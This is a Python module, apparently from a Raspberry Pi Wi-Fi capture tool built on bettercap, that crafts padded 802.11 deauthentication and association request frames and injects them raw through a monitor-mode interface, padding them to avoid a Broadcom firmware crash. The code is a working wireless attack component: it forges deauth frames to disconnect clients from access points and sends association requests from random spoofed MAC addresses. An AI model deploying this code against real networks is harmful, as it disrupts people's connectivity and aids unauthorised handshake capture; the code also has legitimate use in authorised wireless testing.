"""
Frame padding for BCM43436B0 PSM watchdog crash prevention.

The BCM43436B0 firmware crashes with PSM watchdog errors when processing
small injection frames (<650 bytes) under heavy TX load. Small frames
complete faster, creating tight timing that triggers the PSM state machine
watchdog. Padding frames above 650 bytes forces the firmware to spend more
time per frame, reducing timing pressure.

This module crafts padded 802.11 deauth and association request frames
and injects them directly through the monitor interface using raw sockets,
bypassing bettercap's built-in wifi.deauth/wifi.assoc which produce
small (~26-60 byte) frames that cannot be padded.

Requires: Linux with AF_PACKET raw socket support (runs on the Pi).
Falls back to standard bettercap commands if raw injection fails.
"""

import logging
import struct
import socket

# Minimum padded frame size to avoid BCM43436B0 PSM watchdog crashes.
# Frames below this threshold can trigger firmware crashes under heavy TX.
MIN_FRAME_SIZE = 650

# 802.11 frame type/subtype constants
FRAME_TYPE_MGMT = 0x00
SUBTYPE_DEAUTH = 0x0C
SUBTYPE_ASSOC_REQ = 0x00

# Deauth reason code: "Previous authentication no longer valid" (common for deauth attacks)
REASON_PREV_AUTH_INVALID = 0x0002

# Vendor-specific IE used for padding (OUI = 00:00:00, benign)
VENDOR_SPECIFIC_IE_TAG = 0xDD
PADDING_OUI = b'\x00\x00\x00'


def _mac_to_bytes(mac_str):
    """Convert 'aa:bb:cc:dd:ee:ff' to 6 bytes."""
    return bytes(int(b, 16) for b in mac_str.split(':'))


def _build_radiotap_header():
    """Minimal radiotap header for raw injection."""
    # version=0, pad=0, length=8, present_flags=0
    return struct.pack('<BBHI', 0, 0, 8, 0)


def _pad_frame(frame_bytes, min_size=MIN_FRAME_SIZE):
    """
    Pad an 802.11 management frame to at least min_size bytes using
    a vendor-specific Information Element filled with null bytes.

    The vendor-specific IE (tag 0xDD) is valid in all management frames
    and will be ignored by receiving stations. This keeps the frame
    well-formed per the 802.11 spec.
    """
    current_size = len(frame_bytes)
    if current_size >= min_size:
        return frame_bytes

    # We need (min_size - current_size) more bytes.
    # IE overhead: 1 byte tag + 1 byte length + 3 bytes OUI = 5 bytes
    padding_needed = min_size - current_size
    ie_overhead = 5  # tag(1) + length(1) + OUI(3)

    if padding_needed <= ie_overhead:
        # Just use a single IE with minimal padding
        ie_data_len = max(padding_needed - 2, 3)  # at least OUI
        ie = bytes([VENDOR_SPECIFIC_IE_TAG, ie_data_len]) + PADDING_OUI + b'\x00' * (ie_data_len - 3)
        return frame_bytes + ie

    # Fill with vendor-specific IE: tag(1) + len(1) + OUI(3) + padding
    ie_payload_len = padding_needed - 2  # subtract tag + length bytes
    # IE length field is 1 byte, max 255. Chain multiple IEs if needed.
    result = frame_bytes
    remaining = padding_needed

    while remaining > 0:
        if remaining <= 2:
            # Too small for a proper IE, just append raw bytes
            # (these bytes are after the last IE so they act as FCS-area padding)
            result += b'\x00' * remaining
            remaining = 0
        else:
            # Max IE payload is 255 bytes
            payload_len = min(remaining - 2, 255)
            # Ensure at least OUI (3 bytes) in payload
            if payload_len < 3:
                payload_len = 3
            ie = bytes([VENDOR_SPECIFIC_IE_TAG, payload_len])
            ie += PADDING_OUI
            ie += b'\x00' * (payload_len - 3)
            result += ie
            remaining -= (2 + payload_len)

    return result


def build_deauth_frame(ap_mac, sta_mac, min_size=MIN_FRAME_SIZE):
    """
    Build a padded 802.11 deauthentication frame.

    Args:
        ap_mac: AP MAC address string (e.g. 'aa:bb:cc:dd:ee:ff')
        sta_mac: Station MAC address string
        min_size: Minimum frame size in bytes (excluding radiotap header)

    Returns:
        bytes: Complete frame with radiotap header, ready for raw injection
    """
    ap = _mac_to_bytes(ap_mac)
    sta = _mac_to_bytes(sta_mac)

    # Frame Control: type=Management(0x00), subtype=Deauth(0x0C)
    # Protocol version 0, To DS=0, From DS=0
    fc = struct.pack('<H', (SUBTYPE_DEAUTH << 4) | FRAME_TYPE_MGMT)

    # Duration/ID
    duration = struct.pack('<H', 0x013A)  # 314 microseconds (common value)

    # Address fields for deauth: DA=station, SA=AP, BSSID=AP
    # Sequence control (will be filled by driver)
    seq_ctrl = struct.pack('<H', 0x0000)

    # Frame body: reason code
    reason = struct.pack('<H', REASON_PREV_AUTH_INVALID)

    # Assemble the management frame (without radiotap)
    frame = fc + duration + sta + ap + ap + seq_ctrl + reason

    # Pad to minimum size
    frame = _pad_frame(frame, min_size)

    # Prepend radiotap header
    return _build_radiotap_header() + frame


def build_assoc_request_frame(ap_mac, sta_mac, ssid=b'', min_size=MIN_FRAME_SIZE):
    """
    Build a padded 802.11 association request frame.

    Args:
        ap_mac: AP MAC address string
        sta_mac: Spoofed station MAC address string
        ssid: SSID bytes (can be empty for broadcast)
        min_size: Minimum frame size in bytes (excluding radiotap header)

    Returns:
        bytes: Complete frame with radiotap header, ready for raw injection
    """
    ap = _mac_to_bytes(ap_mac)
    sta = _mac_to_bytes(sta_mac)

    # Frame Control: type=Management(0x00), subtype=AssocReq(0x00)
    fc = struct.pack('<H', (SUBTYPE_ASSOC_REQ << 4) | FRAME_TYPE_MGMT)

    # Duration/ID
    duration = struct.pack('<H', 0x013A)

    # Address fields: DA=AP, SA=station, BSSID=AP
    seq_ctrl = struct.pack('<H', 0x0000)

    # Fixed parameters: Capability Info + Listen Interval
    capability = struct.pack('<H', 0x0431)  # ESS, Short Preamble, Short Slot Time
    listen_interval = struct.pack('<H', 0x000A)

    # Tagged parameters
    # SSID IE
    ssid_ie = bytes([0x00, len(ssid)]) + ssid

    # Supported Rates IE (mandatory)
    supported_rates = bytes([0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24])

    # Assemble frame
    frame = (fc + duration + ap + sta + ap + seq_ctrl +
             capability + listen_interval + ssid_ie + supported_rates)

    # Pad to minimum size
    frame = _pad_frame(frame, min_size)

    return _build_radiotap_header() + frame


def _generate_random_mac():
    """Generate a random MAC address for use as spoofed station in assoc frames."""
    import random
    # Use locally-administered, unicast MAC (second nibble is 2, 6, A, or E)
    first_byte = random.randint(0, 255) & 0xFC | 0x02  # locally administered, unicast
    rest = [random.randint(0, 255) for _ in range(5)]
    return ':'.join('%02x' % b for b in [first_byte] + rest)


def inject_raw_frame(iface, frame_bytes):
    """
    Inject a raw 802.11 frame through a monitor-mode interface.

    Args:
        iface: Monitor interface name (e.g. 'wlan0mon')
        frame_bytes: Complete frame bytes including radiotap header

    Returns:
        True if injection succeeded, False otherwise
    """
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        sock.bind((iface, 0))
        sock.send(frame_bytes)
        sock.close()
        return True
    except OSError as e:
        logging.debug("[frame_padding] raw injection failed on %s: %s", iface, e)
        return False
    except AttributeError:
        # AF_PACKET not available (not Linux)
        logging.debug("[frame_padding] AF_PACKET not available, raw injection not supported")
        return False


def send_padded_deauth(iface, ap_mac, sta_mac, min_size=MIN_FRAME_SIZE):
    """
    Send a padded deauthentication frame.

    Args:
        iface: Monitor interface name
        ap_mac: AP MAC address string
        sta_mac: Station MAC address string
        min_size: Minimum frame size

    Returns:
        True if raw injection succeeded, False if caller should fall back to bettercap
    """
    frame = build_deauth_frame(ap_mac, sta_mac, min_size)
    logging.debug("[frame_padding] injecting padded deauth (%d bytes) %s -> %s",
                  len(frame), ap_mac, sta_mac)
    return inject_raw_frame(iface, frame)


def send_padded_assoc(iface, ap_mac, min_size=MIN_FRAME_SIZE):
    """
    Send a padded association request frame with a random spoofed station MAC.

    Args:
        iface: Monitor interface name
        ap_mac: AP MAC address string
        min_size: Minimum frame size

    Returns:
        True if raw injection succeeded, False if caller should fall back to bettercap
    """
    sta_mac = _generate_random_mac()
    frame = build_assoc_request_frame(ap_mac, sta_mac, ssid=b'', min_size=min_size)
    logging.debug("[frame_padding] injecting padded assoc request (%d bytes) %s -> %s",
                  len(frame), sta_mac, ap_mac)
    return inject_raw_frame(iface, frame)
